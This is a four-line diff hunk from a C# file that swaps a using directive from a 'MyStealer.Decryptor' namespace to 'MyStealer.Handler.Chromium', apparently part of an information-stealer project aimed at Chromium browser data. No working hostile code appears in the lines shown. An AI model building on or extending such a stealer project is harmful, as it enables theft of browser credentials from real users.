@@ -1,4 +1,4 @@
-﻿using MyStealer.Decryptor;
+﻿using MyStealer.Handler.Chromium;
 using Newtonsoft.Json.Linq;
 using Serilog;
 using System;
